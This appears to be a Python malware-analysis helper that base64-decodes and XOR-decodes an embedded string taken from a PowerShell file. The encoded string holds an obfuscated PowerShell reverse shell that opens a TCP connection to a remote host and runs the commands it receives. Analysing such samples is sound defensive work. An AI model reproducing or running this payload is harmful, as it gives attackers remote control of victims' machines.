import base64

def decode_powershell_script(encoded_script, xor_key):
    # Decode base64
    decoded_bytes = base64.b64decode(encoded_script)
    
    # XOR decode
    decoded = bytearray()
    for byte in decoded_bytes:
        decoded.append(byte ^ xor_key)
    
    return decoded.decode('ascii')

# The encoded script from the PowerShell file
encoded_script = "fjk2Mz80LnpnehQ/LXcVODA/OS56CSMpLj83dBQ/LnQJNTkxPy4pdA4ZChk2Mz80LnJ4aGhpdGhvbnRramN0Ymx4dmNqamtzYVB+KS4oPzs3emd6fjk2Mz80LnQdPy4JLig/Ozdyc2FQATgjLj8BBwd+OCMuPyl6Z3pqdHRsb29pbyZ/IWonYVAtMjM2P3JyfjN6Z3p+KS4oPzs3dAg/Oz5yfjgjLj8pdnpqdnp+OCMuPyl0Fj80PS4yc3N6dzQ/empzIVB+PjsuO3pnenIUPy13FTgwPzkuencOIyo/FDs3P3oJIykuPzd0Dj8iLnQbCRkTEx80OTU+MzQ9c3QdPy4JLigzND1yfjgjLj8pdmp2en4zc2FQfik/ND44Ozkxemd6cjM/Inp+PjsuO3poZHxreiZ6FS8udwkuKDM0PXpzYVB+KT80Pjg7OTFoenpnen4pPzQ+ODs5MXpxengKCXp4enF6ciotPnN0CjsuMnpxenhkenhhUH4pPzQ+OCMuP3pnenIBLj8iLnQ/NDk1PjM0PQdgYBsJGRMTc3QdPy4YIy4/KXJ+KT80Pjg7OTFoc2FQfikuKD87N3QNKDMuP3J+KT80PjgjLj92anZ+KT80PjgjLj90Fj80PS4yc2FQfikuKD87N3QcNi8pMnJzJ2FQfjk2Mz80LnQZNjUpP3Jz"

# XOR key from the PowerShell script (0x5A)
xor_key = 0x5A

# Decode the script
try:
    decoded_script = decode_powershell_script(encoded_script, xor_key)
    print("Decoded PowerShell script:")
    print("-" * 50)
    print(decoded_script)
except Exception as e:
    print(f"Error decoding: {e}")